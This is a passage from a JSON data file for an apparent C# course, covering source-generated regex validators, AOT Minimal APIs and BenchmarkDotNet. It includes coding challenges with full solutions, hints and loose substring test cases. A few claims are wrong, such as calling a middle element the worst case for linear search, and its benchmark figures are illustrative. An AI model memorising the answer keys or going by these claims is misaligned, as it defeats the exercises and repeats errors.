              "solution": "using System.Text.RegularExpressions;\n\npublic partial class InputValidators\n{\n    // Credit card: 16 digits with optional dashes or spaces every 4\n    [GeneratedRegex(@\"^\\d{4}[-\\s]?\\d{4}[-\\s]?\\d{4}[-\\s]?\\d{4}$\")]\n    public static partial Regex CreditCardRegex();\n    \n    // Postal code: 5 digits or 5+4 format\n    [GeneratedRegex(@\"^\\d{5}(-\\d{4})?$\")]\n    public static partial Regex PostalCodeRegex();\n    \n    // Username: 3-20 alphanumeric + underscore\n    [GeneratedRegex(@\"^[a-zA-Z0-9_]{3,20}$\")]\n    public static partial Regex UsernameRegex();\n    \n    // Strong password: 8+ chars, upper, lower, digit, special\n    [GeneratedRegex(@\"^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$\")]\n    public static partial Regex StrongPasswordRegex();\n    \n    // Helper methods for cleaner API\n    public static bool IsValidCreditCard(string input) => \n        CreditCardRegex().IsMatch(input);\n    \n    public static bool IsValidPostalCode(string input) => \n        PostalCodeRegex().IsMatch(input);\n    \n    public static bool IsValidUsername(string input) => \n        UsernameRegex().IsMatch(input);\n    \n    public static bool IsStrongPassword(string input) => \n        StrongPasswordRegex().IsMatch(input);\n}\n\n// Test the validators\nConsole.WriteLine(\"=== AOT-Ready Input Validation ===\");\n\n// Valid test data\nvar validCard = \"1234-5678-9012-3456\";\nvar validPostal = \"12345-6789\";\nvar validUser = \"user_123\";\nvar validPassword = \"Secure@123\";\n\n// Invalid test data\nvar invalidCard = \"1234-5678\";\nvar invalidPostal = \"1234\";\nvar invalidUser = \"ab\";\nvar invalidPassword = \"weak\";\n\nConsole.WriteLine(\"\\n--- Valid Inputs ---\");\nConsole.WriteLine($\"Credit Card '{validCard}': {InputValidators.IsValidCreditCard(validCard)}\");\nConsole.WriteLine($\"Postal Code '{validPostal}': {InputValidators.IsValidPostalCode(validPostal)}\");\nConsole.WriteLine($\"Username '{validUser}': {InputValidators.IsValidUsername(validUser)}\");\nConsole.WriteLine($\"Password '{validPassword}': {InputValidators.IsStrongPassword(validPassword)}\");\n\nConsole.WriteLine(\"\\n--- Invalid Inputs ---\");\nConsole.WriteLine($\"Credit Card '{invalidCard}': {InputValidators.IsValidCreditCard(invalidCard)}\");\nConsole.WriteLine($\"Postal Code '{invalidPostal}': {InputValidators.IsValidPostalCode(invalidPostal)}\");\nConsole.WriteLine($\"Username '{invalidUser}': {InputValidators.IsValidUsername(invalidUser)}\");\nConsole.WriteLine($\"Password '{invalidPassword}': {InputValidators.IsStrongPassword(invalidPassword)}\");\n\nConsole.WriteLine(\"\\nAll regex compiled at build time - AOT ready!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should show validation results",
                  "expectedOutput": "True",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should confirm AOT readiness",
                  "expectedOutput": "AOT ready",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "[GeneratedRegex(@\"pattern\")] on a partial static method. The @ allows backslashes without escaping."
                },
                {
                  "level": 2,
                  "text": "Lookaheads for password: (?=.*[a-z]) means 'somewhere has lowercase'. Stack multiple lookaheads for AND logic."
                },
                {
                  "level": 3,
                  "text": "Optional groups: (-\\d{4})? matches dash + 4 digits, or nothing. The ? makes it optional."
                },
                {
                  "level": 4,
                  "text": "Character class [-\\s] matches dash or whitespace. Use for flexible separators in credit cards."
                },
                {
                  "level": 5,
                  "text": "Quantifiers: {3,20} means 3 to 20 occurrences. {8,} means 8 or more."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Making the method non-static or non-partial",
                  "consequence": "[GeneratedRegex] requires 'static partial' method signature. Otherwise generator ignores it!",
                  "correction": "public static partial Regex MethodName(); - both static AND partial required."
                },
                {
                  "mistake": "Using Regex.Match instead of generated method",
                  "consequence": "Regex.Match(input, pattern) compiles pattern at runtime - not AOT compatible!",
                  "correction": "Call the generated method: MyRegex().IsMatch(input) uses precompiled pattern."
                },
                {
                  "mistake": "Forgetting to escape special characters",
                  "consequence": "Pattern [a-z]+ might need \\[ or \\. for literal brackets/dots. Wrong escaping = wrong matches.",
                  "correction": "Use @ verbatim strings: @\"\\d+\" - one backslash in the pattern. Or regular: \"\\\\d+\" - escaped backslash."
                },
                {
                  "mistake": "Overly complex password regex",
                  "consequence": "Regex with many lookaheads can be slow or hit catastrophic backtracking.",
                  "correction": "Keep it simple, or validate in steps: check length, then check each requirement separately."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-17-04",
          "title": "Minimal APIs with AOT",
          "moduleId": "module-17",
          "order": 4,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Think of building a web API like opening a food stand:\n\nTRADITIONAL API (Full Restaurant):\n- Full kitchen with every appliance\n- Wait staff, hosts, managers\n- Menu changes handled at runtime\n- Flexible but heavy setup\n\nMINIMAL API (Food Truck):\n- Just what you need to serve food\n- Streamlined operations\n- Fixed menu, optimized workflow\n- Light, fast, mobile\n\nMINIMAL API + AOT (Pre-Packaged Food Truck):\n- Everything prepared before opening\n- No cooking at runtime, just serving\n- Fastest possible service\n- Perfect for specific, focused menus\n\nWHY MINIMAL APIS FOR AOT:\n- Less framework overhead\n- Explicit type declarations (no reflection)\n- Source generators for JSON\n- Optimized for startup time\n\nKEY DIFFERENCES:\n\nTraditional Controllers:\n- [ApiController], [Route], [HttpGet] attributes\n- Model binding via reflection\n- Complex routing rules\n\nMinimal APIs:\n- app.MapGet(\"/path\", handler)\n- Explicit parameter types\n- Simple, direct routing\n\nAOT REQUIREMENTS:\n- Use source-generated JSON contexts\n- Explicit type parameters\n- Avoid dynamic features\n- Configure AOT in project file\n\nThink: 'Minimal APIs + AOT = Food truck with everything pre-packaged. Setup once, serve instantly!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== AOT-COMPATIBLE MINIMAL API =====\n// Project file settings:\n// <PublishAot>true</PublishAot>\n// <InvariantGlobalization>true</InvariantGlobalization>\n\nusing System.Text.Json;\nusing System.Text.Json.Serialization;\n\nvar builder = WebApplication.CreateSlimBuilder(args);\n\n// Configure JSON with source generator (required for AOT!)\nbuilder.Services.ConfigureHttpJsonOptions(options =>\n{\n    options.SerializerOptions.TypeInfoResolverChain.Insert(0, AppJsonContext.Default);\n});\n\nvar app = builder.Build();\n\n// ===== ENDPOINTS =====\n\n// Simple GET\napp.MapGet(\"/\", () => \"Hello, AOT World!\");\n\n// GET with typed response\napp.MapGet(\"/health\", () => new HealthStatus(\"Healthy\", DateTime.UtcNow));\n\n// GET with route parameter\napp.MapGet(\"/products/{id}\", (int id) =>\n{\n    var product = new Product(id, $\"Product {id}\", 19.99m);\n    return Results.Ok(product);\n});\n\n// GET all products\napp.MapGet(\"/products\", () =>\n{\n    var products = new List<Product>\n    {\n        new(1, \"Widget\", 29.99m),\n        new(2, \"Gadget\", 49.99m),\n        new(3, \"Gizmo\", 39.99m)\n    };\n    return Results.Ok(products);\n});\n\n// POST with typed body\napp.MapPost(\"/products\", (Product product) =>\n{\n    // In real app, save to database\n    Console.WriteLine($\"Created: {product.Name}\");\n    return Results.Created($\"/products/{product.Id}\", product);\n});\n\n// PUT with route param and body\napp.MapPut(\"/products/{id}\", (int id, Product product) =>\n{\n    if (id != product.Id)\n        return Results.BadRequest(\"ID mismatch\");\n    \n    Console.WriteLine($\"Updated: {product.Name}\");\n    return Results.Ok(product);\n});\n\n// DELETE\napp.MapDelete(\"/products/{id}\", (int id) =>\n{\n    Console.WriteLine($\"Deleted product {id}\");\n    return Results.NoContent();\n});\n\n// ===== QUERY PARAMETERS =====\napp.MapGet(\"/search\", (string? query, int page = 1, int size = 10) =>\n{\n    var result = new SearchResult(query ?? \"\", page, size, Array.Empty<Product>());\n    return Results.Ok(result);\n});\n\napp.Run();\n\n// ===== MODELS =====\npublic record Product(int Id, string Name, decimal Price);\npublic record HealthStatus(string Status, DateTime CheckedAt);\npublic record SearchResult(string Query, int Page, int Size, Product[] Results);\n\n// ===== JSON SOURCE GENERATOR (Required for AOT!) =====\n[JsonSerializable(typeof(Product))]\n[JsonSerializable(typeof(List<Product>))]\n[JsonSerializable(typeof(Product[]))]\n[JsonSerializable(typeof(HealthStatus))]\n[JsonSerializable(typeof(SearchResult))]\n[JsonSourceGenerationOptions(PropertyNamingPolicy = JsonKnownNamingPolicy.CamelCase)]\ninternal partial class AppJsonContext : JsonSerializerContext { }\n\n// ===== OUTPUT =====\nConsole.WriteLine(\"Minimal API with AOT support!\");\nConsole.WriteLine(\"Endpoints:\");\nConsole.WriteLine(\"  GET  / - Hello world\");\nConsole.WriteLine(\"  GET  /health - Health check\");\nConsole.WriteLine(\"  GET  /products - List all\");\nConsole.WriteLine(\"  GET  /products/{id} - Get one\");\nConsole.WriteLine(\"  POST /products - Create\");\nConsole.WriteLine(\"  PUT  /products/{id} - Update\");\nConsole.WriteLine(\"  DELETE /products/{id} - Delete\");\nConsole.WriteLine(\"\\nPublish: dotnet publish -c Release -r linux-x64\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`WebApplication.CreateSlimBuilder(args)`**: Lighter than CreateBuilder(). Excludes features not needed for minimal APIs. Better for AOT size optimization.\n\n**`ConfigureHttpJsonOptions`**: Registers your JSON context with the HTTP pipeline. Without this, serialization fails in AOT!\n\n**`TypeInfoResolverChain.Insert(0, Context.Default)`**: Puts your source-generated context first in the resolver chain. Ensures AOT-compatible serialization is used.\n\n**`app.MapGet(\"/path\", handler)`**: Registers GET endpoint. Handler can be lambda or method. Return type determines response format.\n\n**`Results.Ok(value)`**: Returns 200 OK with serialized body. Results class provides all common HTTP responses.\n\n**`Results.Created(location, value)`**: Returns 201 Created with Location header and body. Used for POST endpoints.\n\n**Route parameters**: `/products/{id}` - curly braces define route parameters. Lambda parameter `(int id)` receives the value.\n\n**Query parameters**: Method parameters not in route come from query string. `?query=test&page=2`"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Minimal API AOT Gotchas\n\n**Strongly Typed Hubs Not Supported**: SignalR strongly typed hubs are NOT compatible with Native AOT in .NET 9. Using them results in build warnings and runtime exceptions. Use weakly-typed hub methods instead.\n\n**CreateSlimBuilder Excludes Features**: Unlike CreateBuilder, CreateSlimBuilder does not include all middleware by default. Features like session, static files, or routing may need explicit configuration.\n\n**JSON Context Registration Order Matters**: Always insert your context at position 0 in TypeInfoResolverChain. If placed after the default resolver, AOT may still attempt reflection-based serialization.\n\n**Lambda Closure Allocations**: Be mindful of closures in endpoint handlers. Capturing variables allocates memory on each request. For high-performance scenarios, use static lambdas or method groups.\n\n**No Dynamic Model Binding**: Unlike MVC controllers, minimal APIs don't support dynamic model binding. All request/response types must be known at compile time and registered with the JSON source generator.\n\n**OpenAPI Support in .NET 9**: ASP.NET Core 9 adds built-in OpenAPI document generation with Native AOT support via Microsoft.AspNetCore.OpenApi package."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-17-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create an AOT-ready Todo API with Minimal APIs!\n\n1. Create models:\n   - TodoItem: Id (int), Title (string), IsComplete (bool), DueDate (DateTime?)\n   - CreateTodoRequest: Title (string), DueDate (DateTime?)\n   - TodoList: Items (List<TodoItem>), TotalCount (int)\n\n2. Create JSON source generator context for all types\n\n3. Implement endpoints:\n   - GET /todos - returns TodoList\n   - GET /todos/{id} - returns single TodoItem or 404\n   - POST /todos - accepts CreateTodoRequest, returns created TodoItem\n   - PUT /todos/{id}/complete - marks item complete, returns updated item\n   - DELETE /todos/{id} - removes item\n\n4. Use in-memory list for storage (simulated database)\n\n5. Configure JSON options to use the source generator",
              "starterCode": "using System.Text.Json;\nusing System.Text.Json.Serialization;\n\nvar builder = WebApplication.CreateSlimBuilder(args);\n\n// TODO: Configure HTTP JSON options with source generator\n\nvar app = builder.Build();\n\n// In-memory storage (simulated database)\nvar todos = new List<TodoItem>\n{\n    new(1, \"Learn AOT\", false, DateTime.Now.AddDays(1)),\n    new(2, \"Build Minimal API\", false, null)\n};\nvar nextId = 3;\n\n// TODO: Implement endpoints\n// GET /todos - returns TodoList with all items\n\n// GET /todos/{id} - returns item or 404\n\n// POST /todos - create new item from CreateTodoRequest\n\n// PUT /todos/{id}/complete - mark complete\n\n// DELETE /todos/{id} - remove item\n\napp.Run();\n\n// TODO: Define models (TodoItem, CreateTodoRequest, TodoList)\n\n// TODO: Create JsonSerializerContext with all types\n\nConsole.WriteLine(\"Todo API ready!\");",
              "solution": "using System.Text.Json;\nusing System.Text.Json.Serialization;\n\nvar builder = WebApplication.CreateSlimBuilder(args);\n\n// Configure JSON with source generator for AOT\nbuilder.Services.ConfigureHttpJsonOptions(options =>\n{\n    options.SerializerOptions.TypeInfoResolverChain.Insert(0, TodoJsonContext.Default);\n});\n\nvar app = builder.Build();\n\n// In-memory storage (simulated database)\nvar todos = new List<TodoItem>\n{\n    new(1, \"Learn AOT\", false, DateTime.Now.AddDays(1)),\n    new(2, \"Build Minimal API\", false, null)\n};\nvar nextId = 3;\n\n// GET /todos - List all todos\napp.MapGet(\"/todos\", () =>\n{\n    var result = new TodoList(todos.ToList(), todos.Count);\n    return Results.Ok(result);\n});\n\n// GET /todos/{id} - Get single todo\napp.MapGet(\"/todos/{id}\", (int id) =>\n{\n    var todo = todos.FirstOrDefault(t => t.Id == id);\n    return todo is null \n        ? Results.NotFound() \n        : Results.Ok(todo);\n});\n\n// POST /todos - Create new todo\napp.MapPost(\"/todos\", (CreateTodoRequest request) =>\n{\n    var newTodo = new TodoItem(nextId++, request.Title, false, request.DueDate);\n    todos.Add(newTodo);\n    return Results.Created($\"/todos/{newTodo.Id}\", newTodo);\n});\n\n// PUT /todos/{id}/complete - Mark as complete\napp.MapPut(\"/todos/{id}/complete\", (int id) =>\n{\n    var index = todos.FindIndex(t => t.Id == id);\n    if (index < 0)\n        return Results.NotFound();\n    \n    var updated = todos[index] with { IsComplete = true };\n    todos[index] = updated;\n    return Results.Ok(updated);\n});\n\n// DELETE /todos/{id} - Remove todo\napp.MapDelete(\"/todos/{id}\", (int id) =>\n{\n    var removed = todos.RemoveAll(t => t.Id == id);\n    return removed > 0 \n        ? Results.NoContent() \n        : Results.NotFound();\n});\n\nConsole.WriteLine(\"Todo API ready!\");\nConsole.WriteLine(\"Endpoints:\");\nConsole.WriteLine(\"  GET    /todos\");\nConsole.WriteLine(\"  GET    /todos/{id}\");\nConsole.WriteLine(\"  POST   /todos\");\nConsole.WriteLine(\"  PUT    /todos/{id}/complete\");\nConsole.WriteLine(\"  DELETE /todos/{id}\");\n\napp.Run();\n\n// Models\npublic record TodoItem(int Id, string Title, bool IsComplete, DateTime? DueDate);\npublic record CreateTodoRequest(string Title, DateTime? DueDate);\npublic record TodoList(List<TodoItem> Items, int TotalCount);\n\n// JSON Source Generator for AOT\n[JsonSerializable(typeof(TodoItem))]\n[JsonSerializable(typeof(List<TodoItem>))]\n[JsonSerializable(typeof(CreateTodoRequest))]\n[JsonSerializable(typeof(TodoList))]\n[JsonSourceGenerationOptions(PropertyNamingPolicy = JsonKnownNamingPolicy.CamelCase)]\ninternal partial class TodoJsonContext : JsonSerializerContext { }",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should list endpoints",
                  "expectedOutput": "GET",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should mention Todo API",
                  "expectedOutput": "Todo API",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "CreateSlimBuilder for lighter AOT builds. ConfigureHttpJsonOptions to register your JSON context."
                },
                {
                  "level": 2,
                  "text": "Results.Ok(), Results.NotFound(), Results.Created(), Results.NoContent() for HTTP responses."
                },
                {
                  "level": 3,
                  "text": "Record 'with' expression for immutable updates: updated = original with { Property = newValue };"
                },
                {
                  "level": 4,
                  "text": "FirstOrDefault returns null if not found. Use is null pattern for cleaner checks."
                },
                {
                  "level": 5,
                  "text": "[JsonSerializable] for every type that gets serialized - including List<T> variations!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting to register JSON context",
                  "consequence": "Serialization falls back to reflection, which fails in AOT! Runtime exception on first request.",
                  "correction": "Always ConfigureHttpJsonOptions and Insert your context into TypeInfoResolverChain."
                },
                {
                  "mistake": "Using CreateBuilder instead of CreateSlimBuilder",
                  "consequence": "Works, but includes unnecessary features. Larger binary, slower startup.",
                  "correction": "Use CreateSlimBuilder for AOT APIs. It's optimized for minimal footprint."
                },
                {
                  "mistake": "Not registering List<T> in JSON context",
                  "consequence": "Single item works, but endpoints returning lists fail!",
                  "correction": "[JsonSerializable(typeof(List<TodoItem>))] - explicit List<T> registration needed."
                },
                {
                  "mistake": "Modifying records directly",
                  "consequence": "Records are immutable! todo.IsComplete = true doesn't compile.",
                  "correction": "Use 'with' expression: var updated = todo with { IsComplete = true };"
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-17-05",
          "title": "Benchmarking with BenchmarkDotNet",
          "moduleId": "module-17",
          "order": 5,
          "estimatedMinutes": 20,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're testing which route is fastest to work. You have TWO approaches:\n\nCAUSAL TESTING (Unreliable):\n- Drive Route A once: 20 minutes\n- Drive Route B once: 25 minutes\n- Conclusion: Route A is faster!\n- Problem: What about traffic? Weather? Red lights?\n\nSCIENTIFIC TESTING (BenchmarkDotNet):\n- Drive each route 100 times\n- At different times, different days\n- Warm up first (learn the route)\n- Measure average, min, max, variance\n- Control for variables\n- Statistical confidence in results\n\nWHY BENCHMARKING MATTERS:\n- 'I think this is faster' is NOT evidence\n- Micro-optimizations can backfire\n- JIT warmup affects first runs\n- Memory allocations matter for GC\n- Different inputs yield different results\n\nBENCHMARKDOTNET FEATURES:\n- Automatic warmup iterations\n- Statistical analysis\n- Memory allocation tracking\n- Multiple runtimes comparison\n- Markdown/HTML reports\n- Baseline comparisons\n\nKEY METRICS:\n- Mean: Average execution time\n- Error: Margin of error (confidence)\n- StdDev: How consistent are the results?\n- Allocated: Memory allocated per operation\n- Gen0/Gen1/Gen2: GC collections triggered\n\nCOMMON FINDINGS:\n- LINQ is convenient but allocates memory\n- String concatenation vs StringBuilder\n- Span<T> vs arrays for slicing\n- Source generators vs reflection\n\nThink: 'BenchmarkDotNet is your performance laboratory - don't guess, measure!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== BENCHMARKDOTNET SETUP =====\n// Install: dotnet add package BenchmarkDotNet\n\n// Run benchmarks:\n// dotnet run -c Release\n// IMPORTANT: Must be Release mode for accurate results!\n\nusing BenchmarkDotNet.Attributes;\nusing BenchmarkDotNet.Running;\nusing System.Text;\nusing System.Text.Json;\nusing System.Text.Json.Serialization;\n\n// Entry point\nBenchmarkRunner.Run<StringConcatBenchmarks>();\n// BenchmarkRunner.Run<JsonBenchmarks>();\n// BenchmarkRunner.Run<CollectionBenchmarks>();\n\n// ===== STRING CONCATENATION BENCHMARKS =====\n[MemoryDiagnoser]  // Track memory allocations\n[RankColumn]       // Show ranking\npublic class StringConcatBenchmarks\n{\n    private readonly string[] _items = Enumerable.Range(1, 100)\n        .Select(i => $\"Item{i}\")\n        .ToArray();\n    \n    [Benchmark(Baseline = true)]  // This is the baseline for comparison\n    public string StringConcat()\n    {\n        var result = \"\";\n        foreach (var item in _items)\n            result += item + \", \";  // Creates new string each time!\n        return result;\n    }\n    \n    [Benchmark]\n    public string StringBuilder_Approach()\n    {\n        var sb = new StringBuilder();\n        foreach (var item in _items)\n            sb.Append(item).Append(\", \");\n        return sb.ToString();\n    }\n    \n    [Benchmark]\n    public string StringJoin()\n    {\n        return string.Join(\", \", _items);\n    }\n}\n\n// ===== JSON SERIALIZATION BENCHMARKS =====\n[MemoryDiagnoser]\npublic class JsonBenchmarks\n{\n    private readonly Product _product = new(1, \"Widget\", 29.99m);\n    private readonly string _json = \"{\\\"Id\\\":1,\\\"Name\\\":\\\"Widget\\\",\\\"Price\\\":29.99}\";\n    \n    // Reflection-based (traditional)\n    [Benchmark(Baseline = true)]\n    public string Serialize_Reflection()\n    {\n        return JsonSerializer.Serialize(_product);\n    }\n    \n    // Source-generated (AOT-compatible)\n    [Benchmark]\n    public string Serialize_SourceGen()\n    {\n        return JsonSerializer.Serialize(_product, BenchJsonContext.Default.Product);\n    }\n    \n    [Benchmark]\n    public Product? Deserialize_Reflection()\n    {\n        return JsonSerializer.Deserialize<Product>(_json);\n    }\n    \n    [Benchmark]\n    public Product? Deserialize_SourceGen()\n    {\n        return JsonSerializer.Deserialize(_json, BenchJsonContext.Default.Product);\n    }\n}\n\n[JsonSerializable(typeof(Product))]\ninternal partial class BenchJsonContext : JsonSerializerContext { }\n\npublic record Product(int Id, string Name, decimal Price);\n\n// ===== COLLECTION BENCHMARKS =====\n[MemoryDiagnoser]\npublic class CollectionBenchmarks\n{\n    private readonly int[] _numbers = Enumerable.Range(1, 1000).ToArray();\n    \n    [Benchmark(Baseline = true)]\n    public int LinqSum()\n    {\n        return _numbers.Where(n => n % 2 == 0).Sum();\n    }\n    \n    [Benchmark]\n    public int ForLoopSum()\n    {\n        var sum = 0;\n        for (var i = 0; i < _numbers.Length; i++)\n        {\n            if (_numbers[i] % 2 == 0)\n                sum += _numbers[i];\n        }\n        return sum;\n    }\n    \n    [Benchmark]\n    public int SpanSum()\n    {\n        var sum = 0;\n        var span = _numbers.AsSpan();\n        foreach (var n in span)\n        {\n            if (n % 2 == 0)\n                sum += n;\n        }\n        return sum;\n    }\n}\n\n// ===== SAMPLE OUTPUT =====\n// |             Method |        Mean |    Allocated |\n// |------------------- |------------:|-------------:|\n// |       StringConcat | 45,234.5 ns |    123,456 B |\n// | StringBuilder_     |    567.8 ns |      1,024 B |\n// |         StringJoin |    234.5 ns |        512 B |\n\nConsole.WriteLine(\"Benchmark complete!\");\nConsole.WriteLine(\"Key insights:\");\nConsole.WriteLine(\"- String += in loop is VERY slow (creates new strings)\");\nConsole.WriteLine(\"- StringBuilder is ~100x faster for many concatenations\");\nConsole.WriteLine(\"- string.Join is even faster for simple cases\");\nConsole.WriteLine(\"- Source-generated JSON is faster than reflection\");\nConsole.WriteLine(\"- For loops often beat LINQ for raw performance\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`BenchmarkRunner.Run<T>()`**: Entry point. Runs all [Benchmark] methods in class T. Must run in Release mode!\n\n**`[Benchmark]`**: Marks a method for benchmarking. Method should return something to prevent dead code elimination.\n\n**`[Benchmark(Baseline = true)]`**: This is the baseline. Other results shown as ratio to baseline (1.5x slower, 2x faster, etc.).\n\n**`[MemoryDiagnoser]`**: Class attribute. Tracks memory allocations per operation. Shows Gen0/1/2 GC collections.\n\n**`[RankColumn]`**: Adds ranking column to results. Shows which method is fastest (1st), second (2nd), etc.\n\n**`[Params(10, 100, 1000)]`**: Vary input size. Benchmark runs for each value. Great for seeing how performance scales.\n\n**`[GlobalSetup]`**: Run once before all benchmarks. Use for expensive initialization that shouldn't be measured.\n\n**Mean, Error, StdDev**: Mean is average. Error is confidence interval. StdDev shows consistency. Low StdDev = reliable results."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Benchmarking Gotchas\n\n**Debug Mode Invalidates Results**: Running benchmarks in Debug mode produces meaningless results due to disabled optimizations. ALWAYS use `dotnet run -c Release`. Debug performance can be 10-100x slower than Release.\n\n**Dead Code Elimination**: If your benchmark method doesn't return a value or use its result, the JIT may optimize away the entire computation! Always return results or use `[Benchmark]` methods that consume their outputs.\n\n**Micro-Benchmark Limitations**: Extremely fast operations (nanoseconds) are hard to measure accurately. Results may have high variance. Consider testing with realistic workloads rather than micro-optimizations.\n\n**Environment Interference**: Background processes, thermal throttling, and power management affect results. Run benchmarks on a quiet system, preferably with multiple iterations to detect anomalies.\n\n**Comparing Across Runtimes**: When comparing .NET 8 vs .NET 9, use separate jobs with explicit runtime configuration. BenchmarkDotNet supports `[Config]` attributes for multi-runtime comparisons.\n\n**Visual Studio Integration**: Visual Studio 2022+ can analyze BenchmarkDotNet results directly. Use the Profiling tools to correlate benchmark results with CPU and memory profiling data."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-17-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a comprehensive benchmark comparing different approaches!\n\n1. Create 'SearchBenchmarks' class with [MemoryDiagnoser]\n\n2. Setup data:\n   - Array of 10,000 Person records (Id, Name, Age)\n   - Dictionary<int, Person> for O(1) lookup\n   - Target ID to search for (5000)\n\n3. Benchmark these search approaches:\n   - LINQ FirstOrDefault (baseline)\n   - For loop search\n   - Array.Find\n   - Dictionary lookup (expected fastest)\n\n4. Add [Params(100, 1000, 10000)] to test different sizes\n\n5. Print expected results analysis\n\nFocus on demonstrating how data structures affect performance!",
              "starterCode": "using BenchmarkDotNet.Attributes;\nusing BenchmarkDotNet.Running;\n\n// TODO: Create Person record (Id, Name, Age)\n\n// TODO: Create SearchBenchmarks class\n// - [MemoryDiagnoser]\n// - [Params(100, 1000, 10000)] for Size property\n// - [GlobalSetup] to initialize data based on Size\n// - Array of Person\n// - Dictionary<int, Person>\n// - Target ID to find\n\n// Benchmark methods:\n// - LinqSearch (Baseline = true)\n// - ForLoopSearch\n// - ArrayFind\n// - DictionaryLookup\n\npublic class SearchBenchmarks\n{\n    // TODO: Implement benchmarks\n}\n\n// Print analysis\nConsole.WriteLine(\"=== Search Performance Analysis ===\");\nConsole.WriteLine(\"Expected results:\");\nConsole.WriteLine(\"- LINQ FirstOrDefault: O(n) - scans until found\");\nConsole.WriteLine(\"- For loop: O(n) - similar but less overhead\");\nConsole.WriteLine(\"- Array.Find: O(n) - optimized but still linear\");\nConsole.WriteLine(\"- Dictionary: O(1) - constant time lookup!\");\n\n// BenchmarkRunner.Run<SearchBenchmarks>();",
              "solution": "using BenchmarkDotNet.Attributes;\nusing BenchmarkDotNet.Running;\n\npublic record Person(int Id, string Name, int Age);\n\n[MemoryDiagnoser]\n[RankColumn]\npublic class SearchBenchmarks\n{\n    [Params(100, 1000, 10000)]\n    public int Size { get; set; }\n    \n    private Person[] _people = Array.Empty<Person>();\n    private Dictionary<int, Person> _dictionary = new();\n    private int _targetId;\n    \n    [GlobalSetup]\n    public void Setup()\n    {\n        // Generate test data\n        _people = Enumerable.Range(1, Size)\n            .Select(i => new Person(i, $\"Person{i}\", 20 + (i % 50)))\n            .ToArray();\n        \n        // Build dictionary for O(1) lookups\n        _dictionary = _people.ToDictionary(p => p.Id);\n        \n        // Search for item in middle (worst-case for linear search)\n        _targetId = Size / 2;\n    }\n    \n    [Benchmark(Baseline = true)]\n    public Person? LinqSearch()\n    {\n        return _people.FirstOrDefault(p => p.Id == _targetId);\n    }\n    \n    [Benchmark]\n    public Person? ForLoopSearch()\n    {\n        for (var i = 0; i < _people.Length; i++)\n        {\n            if (_people[i].Id == _targetId)\n                return _people[i];\n        }\n        return null;\n    }\n    \n    [Benchmark]\n    public Person? ArrayFind()\n    {\n        return Array.Find(_people, p => p.Id == _targetId);\n    }\n    \n    [Benchmark]\n    public Person? DictionaryLookup()\n    {\n        return _dictionary.TryGetValue(_targetId, out var person) ? person : null;\n    }\n}\n\n// Print analysis\nConsole.WriteLine(\"=== Search Performance Analysis ===\");\nConsole.WriteLine();\nConsole.WriteLine(\"Benchmark setup:\");\nConsole.WriteLine(\"- Array sizes: 100, 1000, 10000 elements\");\nConsole.WriteLine(\"- Search target: middle element (worst case for linear)\");\nConsole.WriteLine(\"- MemoryDiagnoser: tracks allocations\");\nConsole.WriteLine();\nConsole.WriteLine(\"Expected results:\");\nConsole.WriteLine(\"- LINQ FirstOrDefault: O(n) - enumerator overhead + delegate calls\");\nConsole.WriteLine(\"- For loop: O(n) - minimal overhead, direct array access\");\nConsole.WriteLine(\"- Array.Find: O(n) - optimized native code, but still linear\");\nConsole.WriteLine(\"- Dictionary: O(1) - constant time regardless of size!\");\nConsole.WriteLine();\nConsole.WriteLine(\"Memory allocations:\");\nConsole.WriteLine(\"- LINQ: Allocates enumerator\");\nConsole.WriteLine(\"- For loop: Zero allocations\");\nConsole.WriteLine(\"- Array.Find: Zero allocations\");\nConsole.WriteLine(\"- Dictionary: Zero allocations (after setup)\");\nConsole.WriteLine();\nConsole.WriteLine(\"Key insight:\");\nConsole.WriteLine(\"Dictionary lookup stays CONSTANT while others grow linearly!\");\nConsole.WriteLine(\"At 10,000 items, Dictionary can be 1000x+ faster.\");\nConsole.WriteLine();\nConsole.WriteLine(\"Run with: dotnet run -c Release\");\n\n// Uncomment to run actual benchmarks:\n// BenchmarkRunner.Run<SearchBenchmarks>();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should explain search performance",
                  "expectedOutput": "O(1)",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should mention Dictionary advantage",
                  "expectedOutput": "Dictionary",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "[GlobalSetup] runs once before benchmarks. Use for data initialization that shouldn't be measured."
                },
                {
                  "level": 2,
